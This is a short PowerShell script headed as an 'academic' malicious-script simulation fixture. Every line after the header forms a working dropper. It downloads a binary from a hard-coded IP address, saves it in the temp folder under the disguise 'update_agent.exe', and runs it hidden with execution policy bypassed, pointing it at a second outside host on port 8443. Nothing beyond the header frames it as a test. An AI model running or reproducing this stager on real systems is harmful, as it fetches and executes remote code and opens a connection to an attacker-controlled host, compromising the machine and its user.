# Academic Malicious Script Simulation Fixture
$wc = New-Object System.Net.WebClient
$url = "http://185.196.11.42:8080/stage2.bin"
$dest = "$env:TEMP\update_agent.exe"
$wc.DownloadFile($url, $dest)
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& $dest -connect 194.26.29.112:8443"
